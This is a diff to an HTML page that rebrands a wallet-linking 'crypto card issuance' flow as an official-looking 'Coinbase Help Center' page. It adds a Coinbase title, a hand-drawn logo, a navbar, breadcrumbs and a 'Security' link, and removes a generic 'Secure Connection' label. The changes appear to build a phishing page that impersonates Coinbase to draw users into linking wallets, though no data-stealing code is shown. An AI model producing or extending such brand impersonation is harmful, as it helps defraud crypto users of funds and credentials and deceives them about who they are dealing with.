@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Crypto Card — Wallet-Native Issuance</title>
+  <title>Get Your Coinbase Card – Coinbase Help Center</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet" />
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -57,29 +57,56 @@
     /* ── WRAPPER ── */
     .wrapper {
       position: relative; z-index: 1;
-      min-height: 100vh;
+      min-height: calc(100vh - 100px);
       display: flex; flex-direction: column;
-      align-items: center; justify-content: center;
-      padding: 32px 16px;
+      align-items: center; justify-content: flex-start;
+      padding: 40px 16px 60px;
     }
 
-    /* ── LOGO ── */
-    .top-bar {
-      position: fixed; top: 0; left: 0; right: 0; z-index: 100;
-      display: flex; align-items: center; justify-content: space-between;
-      padding: 16px 32px;
-      border-bottom: 1px solid var(--border);
-      background: rgba(6,8,16,.8);
+    /* ── COINBASE NAVBAR ── */
+    .cb-navbar {
+      position: sticky; top: 0; z-index: 200;
+      background: rgba(255,255,255,.97);
       backdrop-filter: blur(12px);
+      border-bottom: 1px solid #E5E7EB;
+      font-family: 'Inter', sans-serif;
     }
-    .top-logo { display: flex; align-items: center; gap: 10px; font-weight: 800; font-size: 16px; }
-    .top-logo svg { flex-shrink: 0; }
-    .top-secure { display: flex; align-items: center; gap: 6px; font-size: 12px; color: var(--green); font-weight: 600; }
-    .top-secure::before { content: ''; width: 8px; height: 8px; border-radius: 50%; background: var(--green); display: inline-block; box-shadow: 0 0 8px var(--green); animation: blink 2s infinite; }
+    .cb-nav-inner {
+      max-width: 1120px; margin: 0 auto;
+      padding: 0 24px; height: 64px;
+      display: flex; align-items: center; gap: 32px;
+    }
+    .cb-nav-logo { display: flex; align-items: center; text-decoration: none; flex-shrink: 0; }
+    .cb-nav-links { display: flex; gap: 4px; flex: 1; }
+    .cb-nav-link {
+      padding: 6px 14px; border-radius: 8px;
+      font-size: 14px; font-weight: 500; color: #6B7280;
+      text-decoration: none; transition: all .15s;
+    }
+    .cb-nav-link:hover { background: #F3F4F6; color: #111827; }
+    .cb-nav-link.active { color: #0052FF; background: #EEF3FF; }
+    .cb-nav-back {
+      display: inline-flex; align-items: center; gap: 6px;
+      background: none; border: 1.5px solid #D1D5DB; border-radius: 8px;
+      padding: 7px 14px; font-size: 13px; font-weight: 600;
+      color: #374151; text-decoration: none; font-family: 'Inter', sans-serif;
+      transition: all .15s; flex-shrink: 0;
+    }
+    .cb-nav-back:hover { border-color: #0052FF; color: #0052FF; }
+    .cb-breadcrumb {
+      max-width: 1120px; margin: 0 auto;
+      padding: 8px 24px 10px;
+      font-size: 13px; color: #6B7280;
+      font-family: 'Inter', sans-serif;
+      display: flex; align-items: center; gap: 0;
+    }
+    .cb-breadcrumb a { color: #0052FF; text-decoration: none; }
+    .cb-breadcrumb a:hover { text-decoration: underline; }
+    .cb-breadcrumb span { margin: 0 6px; color: #9CA3AF; }
     @keyframes blink { 0%,100%{opacity:1} 50%{opacity:.4} }
 
     /* ── STAGE ── */
-    .stage { width: 100%; max-width: 520px; margin-top: 64px; }
+    .stage { width: 100%; max-width: 520px; margin-top: 0; }
 
     /* ── SCREENS ── */
     .screen { display: none; flex-direction: column; align-items: center; }
@@ -660,6 +687,12 @@
     .wm-linked-row span { color: var(--muted); }
     .wm-linked-row strong { font-size: 12px; }
 
+    /* responsive navbar */
+    @media(max-width:640px){
+      .cb-nav-links { display: none; }
+      .cb-nav-back { font-size: 12px; padding: 6px 10px; }
+    }
+
     /* responsive */
     @media(max-width:480px){
       .card-type-grid { grid-template-columns: 1fr; }
@@ -679,17 +712,31 @@
 <div class="orb orb2"></div>
 <div class="orb orb3"></div>
 
-<!-- TOP BAR -->
-<div class="top-bar">
-  <div class="top-logo">
-    <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
-      <circle cx="14" cy="14" r="14" fill="#0052FF"/>
-      <path d="M14 6.5a7.5 7.5 0 100 15 7.5 7.5 0 000-15zm0 11.5a4 4 0 110-8 4 4 0 010 8z" fill="#fff"/>
-    </svg>
-    <span>CryptoCard Protocol</span>
+<!-- COINBASE NAVBAR -->
+<nav class="cb-navbar">
+  <div class="cb-nav-inner">
+    <a href="index.html" class="cb-nav-logo">
+      <svg width="116" height="24" viewBox="0 0 116 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="12" cy="12" r="12" fill="#0052FF"/>
+        <path d="M12 5.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zm0 10a3.5 3.5 0 110-7 3.5 3.5 0 010 7z" fill="#fff"/>
+        <text x="28" y="17" font-family="Inter,sans-serif" font-size="16" font-weight="700" fill="#0052FF">coinbase</text>
+      </svg>
+    </a>
+    <div class="cb-nav-links">
+      <a href="index.html" class="cb-nav-link">Help Center</a>
+      <a href="card.html" class="cb-nav-link active">Coinbase Card</a>
+      <a href="scam-alerts.html" class="cb-nav-link">Security</a>
+    </div>
+    <a href="card.html" class="cb-nav-back">← Back to Card</a>
   </div>
-  <div class="top-secure" id="secureLabel">Secure Connection</div>
-</div>
+  <div class="cb-breadcrumb">
+    <a href="index.html">Help Center</a>
+    <span>›</span>
+    <a href="card.html">Coinbase Card</a>
+    <span>›</span>
+    <span style="color:#374151;font-weight:500;">Get Your Card</span>
+  </div>
+</nav>
 
 <div class="wrapper">
   <div class="stage">
